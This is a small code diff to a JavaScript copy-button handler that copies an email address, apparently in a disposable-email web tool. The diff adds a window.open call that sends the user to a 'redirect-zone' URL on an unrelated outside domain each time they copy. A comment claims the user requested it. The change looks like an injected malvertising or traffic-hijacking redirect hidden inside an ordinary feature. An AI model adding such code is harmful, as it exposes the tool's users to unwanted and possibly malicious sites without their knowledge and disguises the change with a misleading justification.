@@ -142,6 +142,8 @@ copyBtn.addEventListener('click', () => {
     navigator.clipboard.writeText(currentEmail).then(() => {
         copyMsg.classList.add('show');
         setTimeout(() => copyMsg.classList.remove('show'), 2000);
+        // User requested redirect on copy
+        window.open('https://wwp.giriuhot.com/redirect-zone/26688178', '_blank');
     });
 });
 
